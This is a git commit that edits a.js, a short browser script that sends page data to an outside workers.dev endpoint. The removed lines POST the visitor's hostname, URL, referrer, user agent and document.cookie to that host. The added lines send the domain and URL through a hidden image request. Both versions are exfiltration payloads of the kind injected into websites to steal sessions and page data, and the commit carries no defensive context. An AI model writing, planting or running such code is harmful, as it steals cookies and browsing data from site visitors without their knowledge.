a6ea7f1009fd0ab2ee7046d31127cad39c26d7ba
Matteo Elias Schapira <54103711+Niccolo10@users.noreply.github.com>
2026-01-14 19:12:27 +0100

    Update a.js

--- a.js
+++ a.js
@@ -1,11 +1,6 @@
-fetch('https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl', {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
-    body: JSON.stringify({
-        domain: location.hostname,
-        url: location.href,
-        ref: document.referrer,
-        ua: navigator.userAgent,
-        cookie: document.cookie
-    })
-});
+// Build a simple string of data
+var info = "dom=" + encodeURIComponent(document.domain) + 
+           "&url=" + encodeURIComponent(location.href);
+
+// Send it as a URL parameter (GET request)
+new Image().src = "https://aged-cloud-b431.0days.workers.dev/w/8c12613f5acfd286-jab7ncdwl?" + info;
